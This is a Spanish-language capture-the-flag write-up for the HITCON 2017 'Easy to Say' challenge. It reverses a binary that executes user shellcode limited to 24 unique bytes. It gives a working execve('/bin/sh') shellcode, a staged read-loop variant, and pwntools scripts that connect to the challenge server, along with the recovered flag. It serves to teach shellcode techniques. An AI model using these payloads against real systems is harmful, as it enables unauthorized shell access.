
## **Enunciado**

Te daban el binario de 64 bits de un servicio corriendo en una máquina remota para que le pases un shellcode y puedas explotarlo para conseguir una shell y leer la flag.

## **Solución**

Hay que pasarle un shellcode como mucho de 24 bytes donde no se puede repetir ningún byte. No vale pasar el filtro de superar esos 24 bytecode que sean diferentes y luego poner detrás tu shellcode clásico de msfvenom. 

Joder, lo iba a explicar en plan sencillito para enterarme y ver lo que he aprendido y un tipo mucho más listo se me ha adelantado:

https://vasco-jofra.github.io/hitcon2017/EasyToSay/

Al lío... 

### **Reversing**

Mirando el binario, lo primero que te llama la atención es la llamada al memcpy:

```asm
mov     rcx, cs:src
mov     rax, cs:dest
mov     edx, 34h        ; n
mov     rsi, rcx        ; src
mov     rdi, rax        ; dest
call    memcpy
```

Es en la instrucción "call memcpy" nos va a copiar "algo" hardcodeado a otra posición de memoria. Este "algo" es un código que se ejecuta previamente a nuestro shellcode que vamos a pasarle. 

```
Breakpoint 3 at 0x555555554d89
```

Así llama a la función memcpy:

```
Guessed arguments:
arg[0]: 0x7ffff7ff3000 --> 0x0 
arg[1]: 0x555555554ee8 --> 0x3148c03148ed3148 
arg[2]: 0x34 ('4')

```

Vamos a tener 0x34h(52) bytes que va a copiar desde la posición de memoria 0x555555554ee8 a la posición de memoria 0x7ffff7ff3000. O sea, siempre se va a copiar a la posición 0x7ffff7ff3000 el contenido de 0x555555554ee8. ¿Qué es lo que hay en esa posición de memoria? Echemos un vistazo:

```
x/32i 0x555555554ee8
   0x555555554ee8:	xor    rbp,rbp
   0x555555554eeb:	xor    rax,rax
   0x555555554eee:	xor    rbx,rbx
   0x555555554ef1:	xor    rcx,rcx
   0x555555554ef4:	xor    rdx,rdx
   0x555555554ef7:	xor    rdi,rdi
   0x555555554efa:	xor    rsi,rsi
   0x555555554efd:	xor    r8,r8
   0x555555554f00:	xor    r9,r9
   0x555555554f03:	xor    r10,r10
   0x555555554f06:	xor    r11,r11
   0x555555554f09:	xor    r12,r12
   0x555555554f0c:	xor    r13,r13
   0x555555554f0f:	xor    r14,r14
   0x555555554f12:	xor    r15,r15
   0x555555554f15:	add    rsp,0x1000
   0x555555554f1c:	add    BYTE PTR [rcx+rbp*2+0x6d],dl <-- Esta línea ya no forma parte de su código
```
Como vemos son 0x34 (bytes) si restamos las posiciones de memoria:

```
   0x555555554f1c-0x555555554ee8=0x34 (el número de bytes que copia en hexadecimal)
```

Entonces tenemos un código que nos va a limpiar todos los registros y va a reservar 0x1000 bytes en la pila, esto importante para luego preparar nuestro shellcode.

Si seguimos con la función main te va a pedir que introduzcas tu shellcode o código:

```asm
lea     rdi, format     ; "Give me your code :"
mov     eax, 0
```

Si seguimos más adelante llama a una función para comprobar ese código que le hemos pasado:

```asm
mov     [rbp+var_2040], rax
mov     rdx, [rbp+var_2040]
lea     rax, [rbp+var_2030]
mov     rsi, rdx
mov     rdi, rax
call    sub_C38
test    eax, eax
jz      short loc_E3F
```

Si miramos en la función 'sub_C38':

```asm
cmp     [rbp+var_40], 18h  <--- Comprueba que el código pasado no supere los 24 bytes
jbe     short loc_C74
```

Luego mediante dos bucles anidadados va comprobando que cada byte de los 24 sea diferente, devuelve 0 si hay alguno igual y 1 si todos son diferentes:

```
signed __int64 __fastcall sub_C38(char *a1, unsigned __int64 a2)
{
  signed __int64 result; // rax@7
  __int64 v3; // rcx@13
  signed int i; // [sp+18h] [bp-28h]@4
  signed int j; // [sp+1Ch] [bp-24h]@5
  char s[24]; // [sp+20h] [bp-20h]@4
  __int64 v7; // [sp+38h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  if ( a2 > 0x18 )
  {
    puts("Overflow");
    exit(-4);
  }
  memset(s, 0, 0x18uLL);
  s[0] = *a1;
  for ( i = 1; i < a2; ++i )
  {
    for ( j = 0; j < i; ++j )
    {
      if ( a1[i] == s[j] )
      {
        result = 0LL;
        goto LABEL_13;
      }
    }
    s[i] = a1[i];
  }
  result = 1LL;
LABEL_13:
  v3 = *MK_FP(__FS__, 40LL) ^ v7;
  return result;
}
```

De vuelta a la función main dependiendo del resultado sigue ejecutándose o se sale:

```asm
call    sub_C38
test    eax, eax
jz      short loc_E3F
```

Si es 0:

```asm
lea     rdi, aInvalidInput
call    puts
mov     edi, 0FFFFFFFDh ; status
call    _exit
```

Si es 1, sigue la ejecucción, y lo que hace es añadir nuestro shellcode detrás del shellcode que ya existe hardcodeado:

```asm
mov     rax, cs:dest
add     rax, 34h
mov     rdx, [rbp+var_2030]
mov     [rax], rdx
mov     rdx, [rbp+var_2028]
mov     [rax+8], rdx
mov     rdx, [rbp+var_2020]
mov     [rax+10h], rdx
lea     rdi, aRun       ; "Run !"
call    puts
mov     rdx, [rbp+var_2038]
mov     eax, 0
call    rdx
nop
mov     rax, [rbp+var_8]
xor     rax, fs:28h
jz      short locret_E5A
```

Entonces terminando con el reversing, tendríamos su código y el nuestro seguidos. Ahora hay que pensar que shellcode de 24 bytes le pasamos que no sea ningún byte igual y que nos permita ejecutar una shell para leer la flag.

### **Exploiting**

Aquí básicamente va a ser un copia y pega de la solución del enlace.

Para lograr ejecutar un /bin/sh, haciendo una llamada a la función execve hay que tener los siguientes valores en estos registros:
```
| %rax          | system call | %rdi                | %rsi                    | %rdx                    |
| ------------- |-------------|---------------------|-------------------------|-------------------------|
|59	        |sys_execve   |const char *filename | const char *const argv[]|	const char *const envp[]|		

```
En ensamblador quedaría así, tener en cuenta que %rsi y %rdx ya están a 0 por el código hardcodeado que se ejecuta antes.


```asm
68 2f 73 68 00      push   0x0068732f   ; 1. '/sh\x00'
68 2f 62 69 6e      push   0x6e69622f   ; 1. '/bin'
48 89 e7            mov    rdi, rsp      ; 2. Poner la dirección de '/bin//sh' en %rdi
b0 3b               mov    al, 0x3b      ; 5. Mover el valor de llamada de sistema en %rax (0x3b=59)
0f 05               syscall             ; 5. Hacer la llamada del sistema
```

No podemos poner usar push porque su opcode \x68 coincide con el caracter 'h' de la shell,  lo hacemos con un mov:

```asm
49 bc 2f 62 69 6e 2f    movabs r12,0x68732f6e69622f
73 68 00
41 54                   push   r12
48 89 e7                mov    rdi, rsp
b0 3b                   mov    al, 0x3b
0f 05                   syscall
```

Para quitar la \x2f repetida le restamos 1 a ese byte y luego se lo sumamos con inc:

```asm
49 bc 2f 62 69 6e 2e    movabs r12,0x68732e6e69622f
73 68 00
41 54                   push   r12
fe 44 24 04             inc    BYTE PTR [rsp+0x4]
48 89 e7                mov    rdi, rsp
b0 3b                   mov    al, 0x3b
0f 05                   syscall
```

El código en ensamblador quedaría así:

```asm
;BITS64
global _start

section .text
_start:

mov r12,0x68732e6e69622f
push r12
inc byte [rsp+0x4]
mov rdi, rsp
mov al, 0x3b
syscall
```

Recordando comandos útiles para compilar ensamblador y sacar los bytes en hexadecimal del shellcode:

```
nasm -f elf64 soluc.asm
ld -o soluc soluc.o
for i in `objdump -d soluc | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
```

Aquí el shellcode ejecutándose en gdb:

```
x/32i 0x7ffff7ff3000
=> 0x7ffff7ff3000:	xor    rbp,rbp
   0x7ffff7ff3003:	xor    rax,rax
   0x7ffff7ff3006:	xor    rbx,rbx
   0x7ffff7ff3009:	xor    rcx,rcx
   0x7ffff7ff300c:	xor    rdx,rdx
   0x7ffff7ff300f:	xor    rdi,rdi
   0x7ffff7ff3012:	xor    rsi,rsi
   0x7ffff7ff3015:	xor    r8,r8
   0x7ffff7ff3018:	xor    r9,r9
   0x7ffff7ff301b:	xor    r10,r10
   0x7ffff7ff301e:	xor    r11,r11
   0x7ffff7ff3021:	xor    r12,r12
   0x7ffff7ff3024:	xor    r13,r13
   0x7ffff7ff3027:	xor    r14,r14
   0x7ffff7ff302a:	xor    r15,r15
   0x7ffff7ff302d:	add    rsp,0x1000
   0x7ffff7ff3034:	movabs r12,0x68732e6e69622f
   0x7ffff7ff303e:	push   r12
   0x7ffff7ff3040:	inc    BYTE PTR [rsp+0x4]
   0x7ffff7ff3044:	mov    rdi,rsp
   0x7ffff7ff3047:	mov    al,0x3b
   0x7ffff7ff3049:	syscall 
   0x7ffff7ff304b:	or     al,BYTE PTR [rax]  <--- Esta línea ya no forma parte del shellcode
```

Por último el cutre script de python para explotarlo en el servidor remoto:

```python
#!/usr/bin/env python
import sys
from pwn import *

lashell='\x49\xbc\x2f\x62\x69\x6e\x2e\x73\x68\x00\x41\x54\xfe\x44\x24\x04\x48\x89\xe7\xb0\x3b\x0f\x05'

addr = "52.69.40.204"
conn = remote(addr, 8361)

conn.recvuntil("Give me your code :")
conn.send(lashell)
conn.recvuntil("Run !")
conn.interactive()
conn.close()
```

Y por fin, la ansiada flag:

```
$ pwd
/home/easy_to_say
$ cat flag
hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
```

Otra solución a estudiar pero esta vez usando la llamada sys_read de syscall:

```asm
;BITS64
global _start

section .text

_start:

add r9w, 0x8285
mov dl, 100
lea rsi, [rel $ -0x010503]
;lea rsi, [rip - 0x010503]

loop:
add rsi, r9
xor eax, eax
syscall
jmp loop
```

Así es como quedaría el python de esta nueva solución:

```python
#!/usr/bin/env python
# coding=utf8

from pwn import remote, shellcraft, asm, context
from time import sleep

context.arch = 'amd64'
p = remote('52.69.40.204', 8361)

shellcode = '''
add r9w, 0x8285
mov dl, 100
lea rsi, [rip - 0x010503]

loop:
add rsi, r9
xor eax, eax
syscall
jmp loop
'''

payload = asm(shellcode)
p.send(payload)
sleep(0.5)
p.sendline(asm(shellcraft.amd64.linux.sh()))
p.interactive()
```

Antes de ejecutar la llamada a sys_read tenemos estos valores:

```
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x64 ('d')
RSI: 0x7ffff7feadbe 
RDI: 0x0 
RBP: 0x0 
RSP: 0x7fffffffd258 --> 0x0 
RIP: 0x7ffff7ff3048 --> 0xf7eb050f 
R8 : 0x0 
R9 : 0x8285 
R10: 0x0 
R11: 0x0 
R12: 0x0 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7ff303c:	lea    rsi,[rip+0xfffffffffffefaf6]        # 0x7ffff7fe2b39
   0x7ffff7ff3043:	add    rsi,r9
   0x7ffff7ff3046:	xor    eax,eax
=> 0x7ffff7ff3048:	syscall 
   0x7ffff7ff304a:	jmp    0x7ffff7ff3043
```

Fijandonos en los valores que nos interesan: 

```
%rax=0 ---> Código de la llamada sys_read
%rdi=0 ---> Unsigned int fd (0 is stdin, 1 is stdout and 2 is stderr)
$rsi=0x7ffff7feadbe ---> char *buf
$rdx=0x64 ---> size_t count
```

Lo que está haciendo es un bucle para leer por consola lo que le enviemos, lo guarda en el bufer de 0x64 en 0x64 bytes. Si nos fijamos en el python después del payload le envía una shell:

```python
p.send(payload)
sleep(0.5)
p.sendline(asm(shellcraft.amd64.linux.sh()))
p.interactive()
```

Elegante ¿eh?


